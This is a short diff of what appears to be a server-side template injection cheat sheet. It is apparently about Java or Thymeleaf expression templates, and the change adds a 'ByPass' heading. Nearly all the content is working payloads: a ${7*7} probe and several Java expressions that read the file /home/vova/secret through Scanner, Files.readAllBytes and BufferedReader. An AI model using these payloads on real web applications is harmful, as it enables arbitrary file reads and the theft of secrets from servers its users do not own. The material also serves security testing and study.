@@ -37,7 +37,10 @@ ByPass:
 ```
 th:text, ${}, ${7*7} = 49
 ${new java.util.Scanner(new java.io.File("/home/vova/secret")).useDelimiter("\\A").next()}
+```
 
+ByPass:
+```
 ${T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/home/vova/secret'))}
 ${new java.util.Scanner(new java.io.File('/home/vova/secret')).useDelimiter("\\A").next()}
 ${new java.io.BufferedReader(new java.io.FileReader('/home/vova/secret')).lines().toArray()}
